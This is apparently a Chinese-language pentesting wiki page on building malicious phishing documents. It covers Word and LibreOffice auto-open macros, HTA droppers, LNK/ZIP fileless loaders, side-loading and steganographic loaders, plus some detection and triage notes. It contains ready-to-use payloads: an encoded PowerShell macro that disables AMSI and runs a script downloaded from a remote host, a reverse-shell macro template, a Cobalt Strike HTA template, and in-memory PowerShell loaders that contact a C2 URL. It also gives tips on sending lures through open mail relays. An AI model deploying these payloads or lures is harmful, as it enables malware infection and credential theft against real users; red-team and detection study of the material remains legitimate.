# 钓鱼文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 会在打开文件前验证文件数据。数据验证通过根据 OfficeOpenXML 标准识别数据结构来执行。如果在识别数据结构时发生任何错误，正在分析的文件将不会被打开。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。不过，可以通过更改文件扩展名来重命名文件，同时仍保留其执行宏的能力。\
例如，RTF 文件在设计上不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并且能够执行宏。\
相同的内部机制也适用于 Microsoft Office 套件中的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查某些 Office 程序会执行哪些扩展名：

```bash
assoc | findstr /i "word excel powerp"
```

引用远程模板的 DOCX 文件（文件 –选项 –加载项 –管理：模板 –转到）如果模板包含宏，也可以“执行”宏。

### 加载外部图像

前往：_插入 --> 快速部件 --> 域_\
_**类别**：链接和引用，**域名**：includePicture，以及 **文件名或 URL**：_ http://<ip>/whatever

![Office Documents - 加载外部图像：前往：插入 -- 快速部件 -- 域](<../../images/image (155).png>)

如需分析收到的文档，而非构造文档，请参阅 [VBA 宏分析：垃圾代码和 UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms)。

### 宏后门

可以使用宏从文档中运行任意代码。

#### 自动加载函数

这类函数越常见，AV 检测到它们的可能性就越高。

- AutoOpen()
- Document_Open()

#### 宏代码示例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 手动移除元数据

转到 **File > Info > Inspect Document > Inspect Document**，这会打开 Document Inspector。点击 **Inspect**，然后点击 **Document Properties and Personal Information** 旁边的 **Remove All**。

#### Doc 扩展名

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 Word 97-2003 **`.doc`**。\
这样做是因为**无法在 `.docx` 中保存宏**，而启用宏的 **`.docm`** 扩展名则**带有污名**（例如，缩略图标上有一个很大的 `!`，而且某些 Web/电子邮件网关会完全拦截它们）。因此，这种**旧版 `.doc` 扩展名是最好的折中选择**。

#### 恶意宏生成器

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT 自动运行宏（Basic）

LibreOffice Writer 文档可以嵌入 Basic 宏，并通过将宏绑定到 **Open Document** 事件（Tools → Customize → Events → Open Document → Macro…），使其在打开文件时自动执行。<sup>[[1]](#references)</sup> 一个简单的反向 shell 宏如下所示：

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

注意字符串中的双引号（`""`）——LibreOffice Basic 使用它们来转义字面双引号，因此以 `...==""")` 结尾的 payload 会保持内部命令和 Shell 参数的引号配对。

投递提示：

- 保存为 `.odt`，并将宏绑定到文档事件，使其在打开时立即触发。
- 使用 `swaks` 发送邮件时，使用 `--attach @resume.odt`（必须带 `@`，这样发送的是文件字节，而不是文件名字符串，作为附件）。当滥用接受未经验证的任意 `RCPT TO` 收件人的 SMTP 服务器时，这一点至关重要。

## HTA 文件

HTA 是一种 Windows 程序，**结合了 HTML 和脚本语言（例如 VBScript 和 JScript）**。它会生成用户界面，并作为“完全受信任”的应用程序运行，不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行，该程序通常随 **Internet Explorer** 一起**安装**，因此 **`mshta` 依赖 IE**。所以，如果 IE 已被卸载，HTA 将无法执行。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML 邮件中的伪造附件卡片

HTML 邮件可以仿照服务商原生的附件预览卡片，而不实际携带附件。Talos 观察到，有人使用四个 Base64 编码的内嵌 PNG MIME 部件重建了 Gmail 卡片。整个视觉元素被包在一个锚点中，`?m=<target-id>` 中的收件人值可用于针对每位收件人进行跟踪。链接以 `//` 开头，而不是 `http://` 或 `https://`；浏览器会解析这种相对协议形式，但只匹配完整 URL 的 URL 提取器可能会漏掉它。<sup>[[11]](#references)</sup>

分析时，应检查原始 MIME，而不要相信渲染后的附件列表。还原内嵌图像部件如何组成视觉卡片，找出包裹它的锚点，并在提取 URL 前规范化相对协议形式的 `href` 值。<sup>[[11]](#references)</sup>

有关信封/标头发件人伪造和 DMARC 对齐测试，请参阅 [SMTP 邮件伪造对策](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)。

## 诱发 NTLM Authentication

有几种方法可以**远程诱发 NTLM authentication**。例如，可以在电子邮件或用户将访问的 HTML 中添加**不可见图像**（甚至通过 HTTP MitM？），也可以向受害者发送**文件地址**，只要**打开文件夹**就会**触发**一次**认证**。

**请在以下页面查看更多相关思路：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或认证信息，还可以**执行 NTLM relay 攻击**：

- [**NTLM Relay 攻击**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8（将 NTLM relay 到证书）**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loader + ZIP 内嵌 Payload（无文件攻击链）

高效的攻击活动会投递一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。诀窍在于，实际的 PowerShell loader 存储在 ZIP 的原始字节中，位于一个唯一标记之后；.lnk 会从中提取并在内存中运行它。<sup>[[2]](#references)</sup>

.lnk 实现的典型 PowerShell 单行命令流程：

1) 在常见路径中查找原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData% 以及当前工作目录的父目录。
2) 读取 ZIP 字节并查找硬编码标记（例如 xFIQCV）。标记之后的所有内容都是内嵌的 PowerShell payload。
3) 将 ZIP 复制到 %ProgramData%，在该目录中解压，并打开诱饵 .docx，使其看起来像是正常文件。
4) 绕过当前进程的 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 对下一阶段进行反混淆（例如移除所有 # 字符），并在内存中执行。

用于提取并运行内嵌阶段的 PowerShell 框架示例：

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

备注
- 投递常滥用信誉良好的 PaaS 子域名（例如，*.herokuapp.com），并可能对 payload 设置门槛（根据 IP/UA 提供无害 ZIP）。
- 下一阶段经常会解密 base64/XOR shellcode，并通过 Reflection.Emit + VirtualAlloc 执行，以尽量减少磁盘痕迹。

同一攻击链中使用的持久化
- 劫持 Microsoft Web Browser control 的 COM TypeLib，使 IE/Explorer 或任何嵌入该控件的应用自动重新启动 payload。<sup>[[2]](#references)[[4]](#references)</sup> 详情和可直接使用的命令见此处：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

狩猎/IOCs
- ZIP 文件中包含追加在压缩包数据后的 ASCII 标记字符串（例如 xFIQCV）。
- `.lnk` 会枚举父目录/用户文件夹以定位 ZIP，并打开诱饵文档。
- 通过 [System.Management.Automation.AmsiUtils]::amsiInitFailed 篡改 AMSI。
- 持续很久的业务邮件线程，最终以托管在可信 PaaS 域名下的链接收尾。

## LNK 诱饵优先 staging → 计划任务持久化 → 可信 CPL side-loading

另一种反复出现的模式是**伪装成文档的 `.lnk`**：它会立即打开无害诱饵，同时在后台部署真正的攻击链。<sup>[[3]](#references)</sup>

观察到的工作流程：
1. 快捷方式**伪装成 PDF**，并使用 `conhost.exe` 或类似代理来启动经过混淆的 PowerShell 下载器。
2. PowerShell 将明显的 token 拆分（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`），使查找 `iwr`、`gci`、`ren`、`cpi` 或 `schtasks` 的简单检测遗漏该命令。
3. stager 会先下载**诱饵文档**并为受害者打开，然后在后台重建恶意文件。
4. payload 可能会以**无关扩展名**写入，然后通过去除填充字符来重命名，从而延迟明显 `.exe` / `.cpl` 文件的出现。
5. 通过**按分钟运行的计划任务**建立持久化，该任务从用户可写路径启动可信主机二进制文件。

此模式的基本狩猎线索：

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

一个值得识别的 staging 布局如下：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 或 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 的案例研究中，计划任务会反复从 `C:\Users\Public\` 启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被放置在它旁边并导出了 **`RunFODW`**，这个受信任的 Microsoft 二进制文件便会 side-load 攻击者的 CPL，而不是合法的系统副本。

随后，该 CPL 会：
- 从 `C:\Windows\Tasks\editor.dat` 读取 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 解密
- 分配可执行内存并复制解密后的 shellcode
- 将 shellcode 指针作为 **`EnumUILanguagesW`** 的回调，以间接方式执行

最后这一步值得单独排查：恶意软件通常会避免直接跳转 `((void(*)())buf)()`，转而滥用一个**接受回调的合法 WinAPI**来转移执行流。

此活动中的解密载荷是 **Donut** shellcode。它随后会将最终 PE 完整映射到内存中，并在当前进程中 patch **AMSI/WLDP/ETW**，然后移交执行。有关 side-loading 和驻留内存的后处理的更多说明，请参阅：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的排查切入点：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后出现可见的诱饵文档。
- 文件短暂下载到 **`C:\Users\Public\`**，随后立即从无意义的扩展名重命名。
- 名称普通（例如 `GoogleErrorReport`）的计划任务从**用户可写目录**执行。
- 受信任的二进制文件从同一个非系统目录加载 **`.cpl` / `.dll`** 文件。
- Base64 文本 blob 写入 **`C:\Windows\Tasks\`**，随后被 side-loaded 模块读取。

## 图像中的隐写分隔载荷（PowerShell stager）

近期的 loader 链会投递经过混淆的 JavaScript/VBS，用于解码并运行 Base64 PowerShell stager。该 stager 会下载一张图像（通常是 GIF），其中以纯文本形式隐藏着一个 Base64 编码的 .NET DLL，并由唯一的起始/结束标记括起来。脚本会搜索这些分隔符（在实际攻击中见过的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取中间的文本，将其 Base64 解码为字节，在内存中加载程序集，并使用 C2 URL 调用已知的入口方法。<sup>[[5]](#references)</sup>

工作流程
- 阶段 1：归档的 JS/VBS dropper → 解码嵌入的 Base64 → 使用 -nop -w hidden -ep bypass 启动 PowerShell stager。
- 阶段 2：PowerShell stager → 下载图像，提取由标记分隔的 Base64，在内存中加载 .NET DLL，并调用其方法（例如 VAI），传入 C2 URL 和选项。
- 阶段 3：Loader 获取最终载荷，通常通过 process hollowing 将其注入受信任的二进制文件（常见的是 MSBuild.exe）。<sup>[[7]](#references)[[8]](#references)</sup> 有关 process hollowing 和受信任工具代理执行的更多内容，请参阅：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

用于从图像中提取 DLL 并在内存中调用 .NET 方法的 PowerShell 示例：

<details>
<summary>PowerShell 隐写载荷提取器和 loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

备注
- 这是 ATT&CK T1027.003（隐写术/标记隐藏）。<sup>[[6]](#references)</sup> 标记会因不同 campaign 而异。
- 加载 assembly 前，通常会先执行 AMSI/ETW bypass 和字符串反混淆。
- 威胁狩猎：扫描下载的图片，查找已知分隔符；识别访问图片并立即解码 Base64 blob 的 PowerShell。

另请参阅 stego 工具和 carving 技术：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS dropper → Base64 PowerShell staging

常见的初始阶段是将一个经过高度混淆的小型 `.js` 或 `.vbs` 文件放在 archive 中发送。它唯一的用途是解码内嵌的 Base64 字符串，并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导加载下一阶段。<sup>[[5]](#references)</sup>

逻辑框架（抽象）：
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 blob
- 解码为 ASCII PowerShell
- 调用 `powershell.exe`，并通过 `wscript.exe`/`cscript.exe` 执行

威胁狩猎线索
- archive 中的 JS/VBS 附件启动 `powershell.exe`，命令行中包含 `-enc`/`FromBase64String`。
- `wscript.exe` 从用户临时路径启动 `powershell.exe -nop -w hidden`。

## 将 MSC 文档用作执行容器（GrimResource）

Microsoft Management Console 文件（`.msc`）是通常由 `mmc.exe` 打开的 XML 控制台定义。**GrimResource** 利用指向包含旧式 XSS 原语的 `apds.dll` 资源的 `StringTable` 引用，使用户打开特制控制台时，JavaScript 能在 `mmc.exe` 内运行。已观察到的样本将基于 `transformNode` 的混淆与 **DotNetToJScript** 结合，在不经过常见 Office 宏路径的情况下实例化 .NET payload。<sup>[[9]](#references)</sup>

进行静态初步检查时，应将不可信的 MSC 视为文本，**不要**双击它：<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高信号运行时线索包括 `mmc.exe` 加载 CLR 或脚本组件、创建网络连接，或启动 `powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe` 或意外的可执行文件。该格式本身是合法的，因此检测应关联 **来源 + 可疑 XML/脚本内容 + `mmc.exe` 行为**，而不是阻止所有 MSC 文件。<sup>[[9]](#references)</sup>

## PDF/QR 重定向器与 payload 门控

PDF 不需要利用漏洞也能发挥作用。近期的 campaign 会在看似无害的文档中放置 **QR code 或普通链接**，将浏览器会话从邮件防护措施中引开，并根据收件人地址个性化目标页面。Microsoft 记录了 2025 年出现的 PDF，其中的 QR URL 对每位收件人都是唯一的，并指向 RaccoonO365 凭据窃取基础设施；另一个类似的攻击链则使用 IP/环境门控，向选定访客返回 JavaScript/MSI 路径，而向扫描器或不允许的客户端返回无害 PDF。<sup>[[10]](#references)</sup>

对 PDF 操作和渲染后的 QR code 都进行 triage。QR code 可能是以矢量绘制的，而不是作为可提取图像存储，因此除了提取嵌入图像外，还要将每一页栅格化：

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

检查从隔离分析系统解码出的目标和重定向，不要进行身份验证。值得关注的狩猎特征包括：邮件正文几乎为空、仅包含 QR code 的 PDF；收件人邮箱嵌入查询参数；经由多个信誉良好的托管服务进行重定向；以及根据 IP、地理位置、cookie、referrer 或 user agent 返回不同内容。使用受控配置对比请求，因为单次 sandbox 抓取可能只会收到诱饵内容。<sup>[[10]](#references)</sup>

## 用于窃取 NTLM hashes 的 Windows 文件

查看 **窃取 NTLM 凭据的位置** 页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：针对美国公司的复杂 phishing 攻击](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – 时尚恶意软件：追踪 Dropping Elephant 通过中国主题 loader 链实施的 tradecraft](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [劫持 TypeLib – 新的 COM persistence 技术（CICADA8）](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader 可投放多种 infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：利用 Microsoft Management Console 实现初始访问和规避](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 威胁行为者利用报税季发起以报税为主题的 phishing 活动](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 投递链与 Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
